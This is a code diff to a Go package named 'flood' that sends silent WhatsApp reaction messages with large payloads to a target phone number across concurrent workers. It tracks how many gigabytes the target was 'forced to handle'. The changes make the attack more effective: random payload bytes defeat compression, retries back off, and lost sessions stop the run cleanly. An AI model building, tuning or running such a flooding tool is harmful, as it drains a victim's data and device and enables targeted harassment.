@@ -9,8 +9,9 @@ package flood
 
 import (
 	"context"
+	"crypto/rand"
 	"errors"
-	"strings"
+	"fmt"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -22,6 +23,15 @@ const bytesPerGiB = 1 << 30
 
 // DefaultPayloadSize is the per-message reaction payload (1 MiB).
 const DefaultPayloadSize = 1 << 20
+
+// likelyRejectedPayloadBytes is the point past which a reaction payload is
+// likely to exceed WhatsApp's accepted message size and be rejected
+// server-side. It is a heuristic for warning, not a hard protocol limit.
+const likelyRejectedPayloadBytes = 64 << 10
+
+// errorBackoff is the pause after a non-fatal send error, so a persistent
+// failure (for example a dropped socket) backs off instead of hot-spinning.
+const errorBackoff = 250 * time.Millisecond
 
 // Settings configures a flood run.
 type Settings struct {
@@ -56,6 +66,11 @@ type Stats struct {
 	Failed    int64
 	StartedAt time.Time
 	Elapsed   time.Duration
+	// Acked is true when sends waited for the server acknowledgement, so Sent
+	// counts server-accepted messages. When false (--no-ack) Sent counts socket
+	// writes the server may still reject, so the data figure is only a loose
+	// upper bound.
+	Acked bool
 }
 
 // Rate returns messages sent per second over the elapsed window.
@@ -67,17 +82,31 @@ func (s Stats) Rate() float64 {
 	return float64(s.Sent) / seconds
 }
 
-// EstimatedGiB estimates the data the target was forced to handle.
+// EstimatedGiB is an upper bound on the data the target was forced to handle:
+// Sent times the payload size. It overstates the real figure by whatever share
+// of sends the server rejected or never delivered, and (with --no-ack) by the
+// rejected sends that were still counted as Sent. It is not a measurement.
 func (s Stats) EstimatedGiB(payloadSize int) float64 {
 	return float64(s.Sent*int64(payloadSize)) / bytesPerGiB
 }
 
-// BuildPayload returns an ASCII reaction string of the requested byte size.
+// BuildPayload returns a reaction string of the requested byte size filled with
+// random printable ASCII. Random (rather than repeated) bytes mean the payload
+// cannot be shrunk by any compression applied before encryption, so a delivered
+// message's on-wire size matches its length.
 func BuildPayload(size int) (string, error) {
 	if size <= 0 {
 		return "", errors.New("payload size must be positive")
 	}
-	return strings.Repeat("A", size), nil
+	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+	buf := make([]byte, size)
+	if _, err := rand.Read(buf); err != nil {
+		return "", fmt.Errorf("generate payload: %w", err)
+	}
+	for i, b := range buf {
+		buf[i] = charset[int(b)%len(charset)]
+	}
+	return string(buf), nil
 }
 
 // Reporter receives progress and lifecycle messages during a flood.
@@ -103,16 +132,36 @@ func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter
 	if err != nil {
 		return Stats{}, err
 	}
+	if settings.PayloadSize > likelyRejectedPayloadBytes {
+		msg := fmt.Sprintf("payload-size %d B likely exceeds WhatsApp's accepted message size (~%d B); oversized reactions are usually rejected server-side, so most sends will not reach the target", settings.PayloadSize, likelyRejectedPayloadBytes)
+		if settings.NoAck {
+			msg += "; --no-ack counts those rejected sends as sent, inflating the data estimate"
+		}
+		warn(msg)
+	}
 
-	runCtx := ctx
-	var cancel context.CancelFunc
+	runCtx, cancel := context.WithCancel(ctx)
+	defer cancel()
 	if settings.Duration > 0 {
-		runCtx, cancel = context.WithTimeout(ctx, settings.Duration)
-		defer cancel()
+		var timeoutCancel context.CancelFunc
+		runCtx, timeoutCancel = context.WithTimeout(runCtx, settings.Duration)
+		defer timeoutCancel()
 	}
 
 	var sent, failed int64
 	started := time.Now()
+
+	// A lost session (logout/unlink) is fatal and non-retryable: capture it
+	// once, stop every worker, and surface it so the run ends cleanly instead
+	// of spinning on a dead socket.
+	var fatalOnce sync.Once
+	var fatalErr error
+	setFatal := func(err error) {
+		fatalOnce.Do(func() {
+			fatalErr = fmt.Errorf("flood stopped: %w", err)
+			cancel()
+		})
+	}
 
 	shouldContinue := func() bool {
 		if settings.MaxMessages > 0 && atomic.LoadInt64(&sent) >= int64(settings.MaxMessages) {
@@ -127,9 +176,20 @@ func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter
 		defer wg.Done()
 		for shouldContinue() {
 			if _, err := m.SendSilentMessage(runCtx, settings.PhoneNumber, payload, sendOpts); err != nil {
-				atomic.AddInt64(&failed, 1)
 				if runCtx.Err() != nil {
 					return
+				}
+				atomic.AddInt64(&failed, 1)
+				if errors.Is(err, messenger.ErrSessionLost) {
+					setFatal(err)
+					return
+				}
+				// Non-fatal error: back off so a persistent failure does not
+				// hot-spin the worker.
+				select {
+				case <-runCtx.Done():
+					return
+				case <-time.After(errorBackoff):
 				}
 				continue
 			}
@@ -150,6 +210,7 @@ func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter
 			Failed:    atomic.LoadInt64(&failed),
 			StartedAt: started,
 			Elapsed:   time.Since(started),
+			Acked:     !settings.NoAck,
 		}
 	}
 
@@ -182,5 +243,5 @@ func Run(ctx context.Context, m messenger.Messenger, settings Settings, reporter
 	if reporter != nil {
 		reporter.Progress(final, settings.PayloadSize)
 	}
-	return final, nil
+	return final, fatalErr
 }
